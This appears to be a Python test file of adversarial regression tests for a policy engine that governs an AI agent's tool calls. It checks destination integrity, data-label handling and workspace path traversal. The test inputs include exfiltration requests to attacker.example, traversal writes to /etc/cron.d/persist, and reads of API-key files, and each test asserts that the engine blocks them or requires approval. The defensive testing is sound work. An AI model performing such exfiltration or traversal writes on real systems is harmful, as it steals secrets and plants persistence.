"""Adversarial regression tests for the Phase 2 security-boundary fixes.

Covers the three hard-debug areas from merge review:
1. destination integrity (policy destination == execution destination),
2. data-label plumbing through canonical inputs,
3. workspace traversal and basename-authorization escapes.
"""

from intentfence_classification import (
    classify_resource,
    is_path_under_root,
    normalize_path,
)
from intentfence_contracts import DecisionType, DestinationClass, ResourceClass
from policy_testkit import (
    WORKSPACE_CONFIG,
    make_context,
    make_contract,
    make_request,
    make_secret_label,
)

from intentfence_policy import (
    CRITICAL_DATA_TO_UNTRUSTED_DESTINATION_RULE_ID,
    SECRET_ACCESS_UNRELATED_TO_INTENT_RULE_ID,
    WRITE_OUTSIDE_WORKSPACE_RULE_ID,
    PolicyInput,
    evaluate_policy,
)
from intentfence_policy.models import EvaluationContext

_EXTERNAL_CLASSES = {
    DestinationClass.KNOWN_EXTERNAL,
    DestinationClass.UNKNOWN_EXTERNAL,
    DestinationClass.BLOCKED,
}


def _build(request=None, contract=None, canonical_destination=None, canonical_resource_class=None):
    policy_input = PolicyInput(
        request=request or make_request(),
        contract=contract or make_contract(),
        context=make_context(),
        canonical_destination=canonical_destination,
        canonical_resource_class=canonical_resource_class,
    )
    return EvaluationContext.build(policy_input, WORKSPACE_CONFIG)


def test_http_policy_uses_same_destination_as_execution():
    request = make_request(
        tool="http_request",
        arguments={
            "destination": "hotel-a.example",
            "url": "https://attacker.example/exfil",
        },
    )
    context = _build(request)
    assert context.destination is not None
    assert "attacker.example" in context.destination
    assert context.destination_class in _EXTERNAL_CLASSES


def test_destination_hint_cannot_mask_http_url():
    label = make_secret_label(purpose="comparison")
    request = make_request(
        tool="http_request",
        arguments={
            "destination": "hotel-a.example",
            "url": "https://attacker.example/collect",
        },
        data_refs=[label.data_id],
    )
    result = evaluate_policy(
        PolicyInput(
            request=request,
            contract=make_contract(allowed_tools=["browse_web", "http_request"]),
            context=make_context(),
            data_labels={label.data_id: label},
        ),
        config=WORKSPACE_CONFIG,
    )
    assert result.decision is DecisionType.BLOCK
    assert CRITICAL_DATA_TO_UNTRUSTED_DESTINATION_RULE_ID in result.matched_rules
    assert result.destination is not None
    assert "attacker.example" in result.destination


def test_canonical_destination_overrides_argument_parsing():
    request = make_request(
        tool="http_request",
        arguments={"url": "https://hotel-a.example/api"},
    )
    context = _build(
        request=request,
        contract=make_contract(),
        canonical_destination="https://attacker.example/collect",
    )
    assert "attacker.example" in (context.destination or "")
    assert context.destination_class in _EXTERNAL_CLASSES


def test_workspace_dotdot_escape_requires_approval():
    request = make_request(
        tool="write_file",
        arguments={"path": "/workspace/../etc/cron.d/persist"},
    )
    result = evaluate_policy(
        PolicyInput(
            request=request,
            contract=make_contract(),
            context=make_context(),
        ),
        config=WORKSPACE_CONFIG,
    )
    assert result.decision is DecisionType.REQUIRE_APPROVAL
    assert WRITE_OUTSIDE_WORKSPACE_RULE_ID in result.matched_rules


def test_workspace_nested_dotdot_escape_requires_approval():
    request = make_request(
        tool="write_file",
        arguments={"path": "/workspace/reports/../../../etc/cron.d/persist"},
    )
    result = evaluate_policy(
        PolicyInput(
            request=request,
            contract=make_contract(),
            context=make_context(),
        ),
        config=WORKSPACE_CONFIG,
    )
    assert result.decision is DecisionType.REQUIRE_APPROVAL
    assert WRITE_OUTSIDE_WORKSPACE_RULE_ID in result.matched_rules


def test_allowed_basename_does_not_authorize_arbitrary_absolute_path():
    contract = make_contract(allowed_resources=["api_key"])
    request = make_request(tool="read_file", arguments={"path": "/etc/api_key"})
    result = evaluate_policy(
        PolicyInput(request=request, contract=contract, context=make_context()),
        config=WORKSPACE_CONFIG,
    )
    assert result.decision is DecisionType.BLOCK
    assert SECRET_ACCESS_UNRELATED_TO_INTENT_RULE_ID in result.matched_rules


def test_allowed_basename_does_not_authorize_write_outside_workspace():
    contract = make_contract(allowed_resources=["notes.txt"])
    request = make_request(
        tool="write_file",
        arguments={"path": "/home/other-user/notes.txt"},
    )
    result = evaluate_policy(
        PolicyInput(request=request, contract=contract, context=make_context()),
        config=WORKSPACE_CONFIG,
    )
    assert WRITE_OUTSIDE_WORKSPACE_RULE_ID in result.matched_rules


def test_scoped_directory_grant_authorizes_contained_secret():
    contract = make_contract(allowed_resources=["vault/"])
    request = make_request(tool="read_file", arguments={"path": "vault/api_key"})
    result = evaluate_policy(
        PolicyInput(request=request, contract=contract, context=make_context()),
        config=WORKSPACE_CONFIG,
    )
    assert SECRET_ACCESS_UNRELATED_TO_INTENT_RULE_ID not in result.matched_rules


def test_exact_canonical_resource_grant_authorizes_outside_workspace_write():
    contract = make_contract(allowed_resources=["/data/report.md"])
    request = make_request(tool="write_file", arguments={"path": "/data/report.md"})
    result = evaluate_policy(
        PolicyInput(request=request, contract=contract, context=make_context()),
        config=WORKSPACE_CONFIG,
    )
    assert WRITE_OUTSIDE_WORKSPACE_RULE_ID not in result.matched_rules


def test_normalize_path_collapses_traversal_segments():
    assert normalize_path("/workspace/../etc/hosts") == "/etc/hosts"
    assert normalize_path("/workspace/reports/../../../etc/x") == "/etc/x"
    assert normalize_path("/a/../../b") == "/b"
    assert normalize_path("notes/./draft.md") == "notes/draft.md"
    assert normalize_path("c:\\windows\\..\\temp\\x") == "c:/temp/x"
    assert normalize_path("../outside/x") == "../outside/x"


def test_workspace_traversal_is_classified_outside_workspace():
    assert (
        classify_resource("/workspace/../etc/hosts", WORKSPACE_CONFIG)
        is ResourceClass.SYSTEM_FILE
    )
    assert (
        classify_resource("/workspace/../vault/api_key", WORKSPACE_CONFIG)
        is ResourceClass.SECRET
    )
    assert classify_resource("/workspace/./reports/x.md", WORKSPACE_CONFIG) is (
        ResourceClass.WORKSPACE_FILE
    )


def test_workspace_containment_uses_canonical_path():
    escaped = normalize_path("/workspace/../secrets")
    assert is_path_under_root(escaped, "/workspace") is False
    assert is_path_under_root(normalize_path("/workspace/sub/x"), "/workspace") is True
